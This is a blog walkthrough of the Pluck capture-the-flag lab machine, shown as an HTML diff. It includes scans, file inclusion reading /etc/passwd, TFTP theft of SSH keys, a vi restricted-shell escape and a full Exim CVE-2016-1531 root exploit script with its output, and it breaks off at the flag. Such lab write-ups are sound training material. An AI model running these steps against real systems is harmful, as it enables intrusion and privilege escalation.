@@ -1,0 +1,926 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Got Pluck? - Core dump overflow</title>
+  <meta name="author" content="chousensha">
+
+  
+  
+  <meta name="description" content="Pluck writeup">
+  <meta name="keywords" content="pluck, pluck vm, pluck vulnhub, pluck writeup, pluck ctf, pluck walkthrough, pluck solution">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://chousensha.github.io/blog/2017/07/06/got-pluck">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Core dump overflow" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-51216602-2']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Core dump overflow</a></h1>
+  
+    <h2>Core dump in progress...</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:chousensha.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/where-to-start">Where to start</a></li>
+  <li><a href="/book-corner">Book corner</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Got Pluck?</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2017-07-06T06:28:41-04:00" pubdate data-updated="true">Jul 6<span>th</span>, 2017</time>
+        
+           | <a href="#disqus_thread"
+             data-disqus-identifier="http://chousensha.github.io">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>New day, new machine to hack! Today&rsquo;s target is called Pluck.</p>
+
+<!-- more -->
+
+
+<h2>Recon</h2>
+
+<p>Nmap results:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>PORT     STATE SERVICE VERSION
+</span><span class='line'>22/tcp   open  ssh     OpenSSH 7.3p1 Ubuntu 1 (Ubuntu Linux; protocol 2.0)
+</span><span class='line'>| ssh-hostkey: 
+</span><span class='line'>|   2048 e8:87:ba:3e:d7:43:23:bf:4a:6b:9d:ae:63:14:ea:71 (RSA)
+</span><span class='line'>|_  256 8f:8c:ac:8d:e8:cc:f9:0e:89:f7:5d:a0:6c:28:56:fd (ECDSA)
+</span><span class='line'>80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+</span><span class='line'>|_http-server-header: Apache/2.4.18 (Ubuntu)
+</span><span class='line'>|_http-title: Pluck
+</span><span class='line'>3306/tcp open  mysql   MySQL (unauthorized)
+</span><span class='line'>5355/tcp open  llmnr?</span></code></pre></td></tr></table></div></figure>
+
+
+<p>First order of business, the web server:</p>
+
+<p><img class="center" src="/images/pentest/pluck/pluck.png" title="pluck" alt="pluck"></p>
+
+<p>I ran Nikto on it and it revealed a couple of vulnerabilities:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>+ Server: Apache/2.4.18 (Ubuntu)
+</span><span class='line'>+ The anti-clickjacking X-Frame-Options header is not present.
+</span><span class='line'>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+</span><span class='line'>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+</span><span class='line'>+ No CGI Directories found (use '-C all' to force check all possible dirs)
+</span><span class='line'>+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+</span><span class='line'>+ /index.php?page=../../../../../../../../../../etc/passwd: The PHP-Nuke Rocket add-in is vulnerable to file traversal, allowing an attacker to view any file on the host. (probably Rocket, but could be any index.php)
+</span><span class='line'>+ OSVDB-29786: /admin.php?en_log_id=0&action=config: EasyNews from http://www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.
+</span><span class='line'>+ OSVDB-29786: /admin.php?en_log_id=0&action=users: EasyNews from http://www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.
+</span><span class='line'>+ OSVDB-3092: /admin.php: This might be interesting...
+</span><span class='line'>+ OSVDB-3268: /images/: Directory indexing found.
+</span><span class='line'>+ OSVDB-3268: /images/?pattern=/etc/*&sort=name: Directory indexing found.
+</span><span class='line'>+ Server leaks inodes via ETags, header found with file /icons/README, fields: 0x13f4 0x438c034968a80 
+</span><span class='line'>+ OSVDB-3233: /icons/README: Apache default file found.
+</span><span class='line'>+ 7535 requests: 0 error(s) and 12 item(s) reported on remote host
+</span><span class='line'>+ End Time:           2017-07-06 09:41:42 (GMT-4) (22 seconds)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>First, I went to the admin page and it seems vulnerable to SQL injection:</p>
+
+<p><img class="center" src="/images/pentest/pluck/admin.png" title="admin" alt="admin sqli"></p>
+
+<p>I fired up sqlmap but I couldn&rsquo;t get anything out of the database. Maybe it was a false lead. Next I looked at the LFI vulnerability that Nikto detected and took a peak at <em>/etc/passwd</em>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root:x:0:0:root:/root:/bin/bash
+</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span><span class='line'>bin:x:2:2:bin:/bin:/usr/sbin/nologin
+</span><span class='line'>sys:x:3:3:sys:/dev:/usr/sbin/nologin
+</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
+</span><span class='line'>games:x:5:60:games:/usr/games:/usr/sbin/nologin
+</span><span class='line'>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+</span><span class='line'>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+</span><span class='line'>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+</span><span class='line'>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+</span><span class='line'>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+</span><span class='line'>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+</span><span class='line'>systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+</span><span class='line'>systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+</span><span class='line'>systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+</span><span class='line'>systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+</span><span class='line'>syslog:x:104:108::/home/syslog:/bin/false
+</span><span class='line'>_apt:x:105:65534::/nonexistent:/bin/false
+</span><span class='line'>messagebus:x:106:109::/var/run/dbus:/bin/false
+</span><span class='line'>mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false
+</span><span class='line'>lxd:x:108:65534::/var/lib/lxd/:/bin/false
+</span><span class='line'>uuidd:x:109:114::/run/uuidd:/bin/false
+</span><span class='line'>dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+</span><span class='line'>sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
+</span><span class='line'>pollinate:x:112:1::/var/cache/pollinate:/bin/false
+</span><span class='line'>bob:x:1000:1000:bob,,,:/home/bob:/bin/bash
+</span><span class='line'>Debian-exim:x:113:119::/var/spool/exim4:/bin/false
+</span><span class='line'>peter:x:1001:1001:,,,:/home/peter:/bin/bash
+</span><span class='line'>paul:x:1002:1002:,,,:/home/paul:/usr/bin/pdmenu
+</span><span class='line'>backup-user:x:1003:1003:Just to make backups easier,,,:/backups:/usr/local/scripts/backup.sh</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The last entry is interesting. I used the LFI to look at the script:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>########################
+</span><span class='line'># Server Backup script #
+</span><span class='line'>########################
+</span><span class='line'>
+</span><span class='line'>#Backup directories in /backups so we can get it via tftp
+</span><span class='line'>
+</span><span class='line'>echo "Backing up data"
+</span><span class='line'>tar -cf /backups/backup.tar /home /var/www/html &gt; /dev/null 2& &gt; /dev/null
+</span><span class='line'>echo "Backup complete"</span></code></pre></td></tr></table></div></figure>
+
+
+<p>A TFTP reference, and I didn&rsquo;t scan for UDP ports. I went back to Nmap real quick:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -T4 -sU -p69 192.168.217.147
+</span><span class='line'>
+</span><span class='line'>Starting Nmap 7.40 ( https://nmap.org ) at 2017-07-06 09:59 EDT
+</span><span class='line'>Nmap scan report for 192.168.217.147
+</span><span class='line'>Host is up (0.00016s latency).
+</span><span class='line'>PORT   STATE         SERVICE
+</span><span class='line'>69/udp open|filtered tftp</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I got the archive via T<a href="FTP:">FTP:</a></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>tftp 192.168.217.147
+</span><span class='line'>tftp&gt; get /backups/backup.tar
+</span><span class='line'>Received 1824718 bytes in 1.4 seconds</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Extracted it to find some home directory contents, besides the source for the website:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>tar -xvf backup.tar 
+</span><span class='line'>home/
+</span><span class='line'>home/bob/
+</span><span class='line'>home/bob/.bashrc
+</span><span class='line'>home/bob/.sudo_as_admin_successful
+</span><span class='line'>home/bob/.profile
+</span><span class='line'>home/bob/.bash_logout
+</span><span class='line'>home/paul/
+</span><span class='line'>home/paul/keys/
+</span><span class='line'>home/paul/keys/id_key3.pub
+</span><span class='line'>home/paul/keys/id_key2.pub
+</span><span class='line'>home/paul/keys/id_key2
+</span><span class='line'>home/paul/keys/id_key4.pub
+</span><span class='line'>home/paul/keys/id_key5.pub
+</span><span class='line'>home/paul/keys/id_key6
+</span><span class='line'>home/paul/keys/id_key1
+</span><span class='line'>home/paul/keys/id_key5
+</span><span class='line'>home/paul/keys/id_key1.pub
+</span><span class='line'>home/paul/keys/id_key6.pub
+</span><span class='line'>home/paul/keys/id_key4
+</span><span class='line'>home/paul/keys/id_key3
+</span><span class='line'>home/paul/.bashrc
+</span><span class='line'>home/paul/.profile
+</span><span class='line'>home/paul/.bash_logout
+</span><span class='line'>home/peter/
+</span><span class='line'>home/peter/.bashrc
+</span><span class='line'>home/peter/.profile
+</span><span class='line'>home/peter/.bash_logout
+</span><span class='line'>var/www/html/
+</span><span class='line'>var/www/html/fonts/
+</span><span class='line'>var/www/html/fonts/glyphicons-halflings-regular.svg
+</span><span class='line'>var/www/html/fonts/glyphicons-halflings-regular.woff2
+</span><span class='line'>var/www/html/fonts/glyphicons-halflings-regular.ttf
+</span><span class='line'>var/www/html/fonts/glyphicons-halflings-regular.woff
+</span><span class='line'>var/www/html/fonts/glyphicons-halflings-regular.eot
+</span><span class='line'>var/www/html/about.php
+</span><span class='line'>var/www/html/index.php
+</span><span class='line'>var/www/html/footer.php
+</span><span class='line'>var/www/html/css/
+</span><span class='line'>var/www/html/css/bootstrap.css.map
+</span><span class='line'>var/www/html/css/bootstrap.min.css.map
+</span><span class='line'>var/www/html/css/bootstrap-theme.css
+</span><span class='line'>var/www/html/css/bootstrap-theme.min.css
+</span><span class='line'>var/www/html/css/bootstrap.min.css
+</span><span class='line'>var/www/html/css/bootstrap-theme.min.css.map
+</span><span class='line'>var/www/html/css/bootstrap-theme.css.map
+</span><span class='line'>var/www/html/css/bootstrap.css
+</span><span class='line'>var/www/html/header.php
+</span><span class='line'>var/www/html/admin.php
+</span><span class='line'>var/www/html/js/
+</span><span class='line'>var/www/html/js/jquery.min.js
+</span><span class='line'>var/www/html/js/bootstrap.js
+</span><span class='line'>var/www/html/js/npm.js
+</span><span class='line'>var/www/html/js/bootstrap.min.js</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Bob&rsquo;s directory:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/home/bob# ls -la
+</span><span class='line'>total 20
+</span><span class='line'>drwxr-xr-x 2 1000 1000 4096 Jan 18 07:43 .
+</span><span class='line'>drwxr-xr-x 5 root root 4096 Jan 18 03:27 ..
+</span><span class='line'>-rw-r--r-- 1 1000 1000  220 Jan 18 00:39 .bash_logout
+</span><span class='line'>-rw-r--r-- 1 1000 1000 3771 Jan 18 00:39 .bashrc
+</span><span class='line'>-rw-r--r-- 1 1000 1000  655 Jan 18 00:39 .profile
+</span><span class='line'>-rw-r--r-- 1 1000 1000    0 Jan 18 03:40 .sudo_as_admin_successful</span></code></pre></td></tr></table></div></figure>
+
+
+<p>That sudo file was empty. On to paul:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/home/paul# ls -la
+</span><span class='line'>total 24
+</span><span class='line'>drwxr-xr-x 3 1002 1002 4096 Jan 18 13:13 .
+</span><span class='line'>drwxr-xr-x 5 root root 4096 Jan 18 03:27 ..
+</span><span class='line'>-rw-r--r-- 1 1002 1002  220 Jan 18 03:04 .bash_logout
+</span><span class='line'>-rw-r--r-- 1 1002 1002 3771 Jan 18 03:04 .bashrc
+</span><span class='line'>drwxrwxr-x 2 1002 1002 4096 Jan 18 13:09 keys
+</span><span class='line'>-rw-r--r-- 1 1002 1002  655 Jan 18 03:04 .profile
+</span><span class='line'>root@kali:~/home/paul# ls -la keys/
+</span><span class='line'>total 56
+</span><span class='line'>drwxrwxr-x 2 1002 1002 4096 Jan 18 13:09 .
+</span><span class='line'>drwxr-xr-x 3 1002 1002 4096 Jan 18 13:13 ..
+</span><span class='line'>-rwxrwxr-x 1 1002 1002  668 Jan 18 13:08 id_key1
+</span><span class='line'>-rwxrwxr-x 1 1002 1002  600 Jan 18 13:08 id_key1.pub
+</span><span class='line'>-rwxrwxr-x 1 1002 1002  672 Jan 18 13:08 id_key2
+</span><span class='line'>-rwxrwxr-x 1 1002 1002  600 Jan 18 13:08 id_key2.pub
+</span><span class='line'>-rwxrwxr-x 1 1002 1002  668 Jan 18 13:08 id_key3
+</span><span class='line'>-rwxrwxr-x 1 1002 1002  600 Jan 18 13:08 id_key3.pub
+</span><span class='line'>-rwxrwxr-x 1 1002 1002 1679 Jan 18 13:09 id_key4
+</span><span class='line'>-rwxrwxr-x 1 1002 1002  392 Jan 18 13:09 id_key4.pub
+</span><span class='line'>-rwxrwxr-x 1 1002 1002  668 Jan 18 13:08 id_key5
+</span><span class='line'>-rwxrwxr-x 1 1002 1002  600 Jan 18 13:08 id_key5.pub
+</span><span class='line'>-rwxrwxr-x 1 1002 1002 1675 Jan 18 13:09 id_key6
+</span><span class='line'>-rwxrwxr-x 1 1002 1002  392 Jan 18 13:09 id_key6.pub</span></code></pre></td></tr></table></div></figure>
+
+
+<p>It looks like paul didn&rsquo;t put much effort into securing his SSH keys. Lastly, peter:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/home/peter# ls -la
+</span><span class='line'>total 20
+</span><span class='line'>drwxr-xr-x 2 1001 1001 4096 Jan 18 03:04 .
+</span><span class='line'>drwxr-xr-x 5 root root 4096 Jan 18 03:27 ..
+</span><span class='line'>-rw-r--r-- 1 1001 1001  220 Jan 18 03:04 .bash_logout
+</span><span class='line'>-rw-r--r-- 1 1001 1001 3771 Jan 18 03:04 .bashrc
+</span><span class='line'>-rw-r--r-- 1 1001 1001  655 Jan 18 03:04 .profile</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Privilege escalation</h2>
+
+<p>Back to paul, and trying those SSH keys. Tried each, the 4th one worked, but it dropped me to this menu:</p>
+
+<p><img class="center" src="/images/pentest/pluck/pdmenu.png" title="pdmenu" alt="pdmenu"></p>
+
+<p>So, what is pdmenu?</p>
+
+<blockquote><p>Pdmenu is a full screen menuing system for Unix. It is designed to be easy to use, and is suitable as a login shell
+for inexperienced users, or it can just be ran at the command line as a handy menu.</p></blockquote>
+
+<p>Not much I can do with this, however, the option to edit a file launches vi! I remembered another challenge where vi helped me escape shell restrictions, and found a <a href="https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells">SANS article</a> about this exact topic. To get a proper shell, I typed the following in vi&rsquo;s command mode:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>:set shell=/bin/bash
+</span><span class='line'>:!bash</span></code></pre></td></tr></table></div></figure>
+
+
+<p></p>
+
+<p>That dropped me into paul&rsquo;s shell:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>paul@pluck:~$ id
+</span><span class='line'>uid=1002(paul) gid=1002(paul) groups=1002(paul)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>SUID enumeration led me to the next step:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>paul@pluck:~$ find / -perm -4000 2&gt;/dev/null
+</span><span class='line'>/usr/exim/bin/exim-4.84-7
+</span><span class='line'>/usr/bin/passwd
+</span><span class='line'>/usr/bin/at
+</span><span class='line'>/usr/bin/newgrp
+</span><span class='line'>/usr/bin/pkexec
+</span><span class='line'>/usr/bin/sudo
+</span><span class='line'>/usr/bin/traceroute6.iputils
+</span><span class='line'>/usr/bin/newuidmap
+</span><span class='line'>/usr/bin/chfn
+</span><span class='line'>/usr/bin/gpasswd
+</span><span class='line'>/usr/bin/newgidmap
+</span><span class='line'>/usr/bin/chsh
+</span><span class='line'>/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span><span class='line'>/usr/lib/policykit-1/polkit-agent-helper-1
+</span><span class='line'>/usr/lib/s-nail/s-nail-privsep
+</span><span class='line'>/usr/lib/openssh/ssh-keysign
+</span><span class='line'>/usr/lib/eject/dmcrypt-get-device
+</span><span class='line'>/bin/su
+</span><span class='line'>/bin/umount
+</span><span class='line'>/bin/mount
+</span><span class='line'>/bin/fusermount
+</span><span class='line'>/bin/ping
+</span><span class='line'>/bin/ntfs-3g</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Exim is a MTA similar to sendmail. Googling for an exploit yielded a <a href="https://www.exploit-db.com/exploits/39535/">local root exploit</a>. I used vi to create a shell script with the exploit code, changed it to executable and ran it:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>paul@pluck:~$ vi rootme.sh 
+</span><span class='line'>paul@pluck:~$ cat rootme.sh 
+</span><span class='line'>echo [ CVE-2016-1531 local root exploit
+</span><span class='line'>cat &gt; /tmp/root.pm &lt;&lt; EOF
+</span><span class='line'>package root;
+</span><span class='line'>use strict;
+</span><span class='line'>use warnings;
+</span><span class='line'> 
+</span><span class='line'>system("/bin/sh");
+</span><span class='line'>EOF
+</span><span class='line'>PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps
+</span><span class='line'>
+</span><span class='line'>paul@pluck:~$ ./rootme.sh 
+</span><span class='line'>[ CVE-2016-1531 local root exploit
+</span><span class='line'># whoami
+</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The flag is mine!</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># cat /root/flag.txt
+</span><span class='line'>
+</span><span class='line'>Congratulations you found the flag
+</span><span class='line'>
+</span><span class='line'>---------------------------------------
+</span><span class='line'>
+</span><span class='line'>######   ((((((((((((((((((((((((((((((
+</span><span class='line'>#########   (((((((((((((((((((((((((((
+</span><span class='line'>,,##########   ((((((((((((((((((((((((
+</span><span class='line'>@@,,,##########   (((((((((((((((((((((
